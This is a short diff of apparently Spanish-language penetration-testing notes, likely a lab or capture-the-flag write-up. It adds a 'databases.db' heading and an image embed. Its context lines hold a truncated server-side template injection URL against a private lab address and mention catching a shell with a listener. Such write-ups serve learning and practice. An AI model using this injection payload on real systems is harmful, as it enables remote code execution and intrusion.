@@ -143,3 +143,6 @@ http://10.13.37.14/profile?name={%25+if+request['application']['__globals__']['_
 al ejecutar la ruta anterior nos lleva directamente al área de reporte y aquí podemos enviar el test y estando a la escucha nos da una shell
 ![[Pasted image 20240712184542.png]]
 
+### databases.db
+
+![[Pasted image 20240712203948.png]]
